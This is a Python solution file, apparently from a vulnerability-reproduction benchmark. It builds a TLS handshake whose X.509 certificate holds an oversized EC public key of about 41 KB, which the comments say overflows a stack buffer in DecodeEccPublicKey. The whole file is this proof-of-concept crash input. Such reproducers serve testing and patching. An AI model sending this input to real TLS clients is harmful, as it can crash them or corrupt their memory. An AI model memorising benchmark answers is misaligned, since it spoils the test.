import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper functions for ASN.1 DER encoding
        def asn1_len(n):
            if n < 128:
                return bytes([n])
            b = []
            while n > 0:
                b.insert(0, n & 0xFF)
                n >>= 8
            return bytes([0x80 | len(b)]) + bytes(b)

        def asn1_tag(tag, data):
            return bytes([tag]) + asn1_len(len(data)) + data

        def asn1_seq(data):
            return asn1_tag(0x30, data)

        def asn1_int(val):
            if val == 0:
                return bytes([0x02, 0x01, 0x00])
            b = []
            temp = val
            while temp > 0:
                b.insert(0, temp & 0xFF)
                temp >>= 8
            if b and (b[0] & 0x80):
                b.insert(0, 0x00)
            return bytes([0x02]) + asn1_len(len(b)) + bytes(b)

        def asn1_oid(oid_str):
            parts = [int(x) for x in oid_str.split('.')]
            if len(parts) < 2:
                return b''
            b = [40 * parts[0] + parts[1]]
            for p in parts[2:]:
                if p < 128:
                    b.append(p)
                else:
                    temp = []
                    temp.append(p & 0x7F)
                    p >>= 7
                    while p > 0:
                        temp.insert(0, (p & 0x7F) | 0x80)
                        p >>= 7
                    b.extend(temp)
            return bytes([0x06]) + asn1_len(len(b)) + bytes(b)

        def asn1_bitstring(data):
            # First byte is number of unused bits (0)
            return bytes([0x03]) + asn1_len(len(data) + 1) + b'\x00' + data

        # OIDs
        # id-ecPublicKey
        OID_EC_KEY = "1.2.840.10045.2.1"
        # secp256r1
        OID_CURVE = "1.2.840.10045.3.1.7"
        # sha256WithRSAEncryption (for dummy signature alg to pass parsing before key decode)
        OID_SIG = "1.2.840.113549.1.1.11"
        # commonName
        OID_CN = "2.5.4.3"

        # Construct payload
        # Vulnerability is stack buffer overflow in DecodeEccPublicKey due to large key.
        # Target length is large enough to overflow stack buffer (typically ~1KB-4KB).
        # Ground truth is ~41KB. We choose a payload size that results in a similar total size.
        
        # 0x04 indicates uncompressed point
        payload_size = 41600 
        key_content = b'\x04' + b'A' * payload_size
        
        # SubjectPublicKeyInfo
        spki = asn1_seq(
            asn1_seq(
                asn1_oid(OID_EC_KEY) +
                asn1_oid(OID_CURVE)
            ) +
            asn1_bitstring(key_content)
        )

        # Name: CN=Fuzz
        name = asn1_seq(asn1_seq(asn1_seq(asn1_oid(OID_CN) + asn1_tag(19, b'Fuzz'))))

        # TBSCertificate
        tbs = asn1_seq(
            asn1_tag(0xA0, asn1_int(2)) + # v3
            asn1_int(12345) + # Serial
            asn1_seq(asn1_oid(OID_SIG) + b'\x05\x00') + # Sig Alg
            name + # Issuer
            asn1_seq( # Validity
                asn1_tag(23, b'220101000000Z') +
                asn1_tag(23, b'300101000000Z')
            ) +
            name + # Subject
            spki
        )

        # Certificate
        cert = asn1_seq(
            tbs +
            asn1_seq(asn1_oid(OID_SIG) + b'\x05\x00') +
            asn1_bitstring(b'\x00' * 16) # Signature
        )

        # TLS Handshake Construction
        # 1. ServerHello
        # TLS 1.2, Cipher TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xC02B)
        sh_body = (
            b'\x03\x03' +             # Version
            b'\xBB' * 32 +            # Random
            b'\x00' +                 # Session ID length
            b'\xC0\x2B' +             # Cipher Suite
            b'\x00'                   # Compression
        )
        sh_msg = b'\x02' + struct.pack('>I', len(sh_body))[1:] + sh_body
        sh_rec = b'\x16\x03\x03' + struct.pack('>H', len(sh_msg)) + sh_msg

        # 2. Certificate
        cert_chain = b'\x00' + struct.pack('>I', len(cert))[1:] + cert
        cert_msg_body = b'\x0B' + struct.pack('>I', len(cert_chain))[1:] + cert_chain
        cert_rec = b'\x16\x03\x03' + struct.pack('>H', len(cert_msg_body)) + cert_msg_body

        # 3. ServerHelloDone
        shd_body = b'\x0E\x00\x00\x00'
        shd_rec = b'\x16\x03\x03' + struct.pack('>H', len(shd_body)) + shd_body

        # Combine
        return sh_rec + cert_rec + shd_rec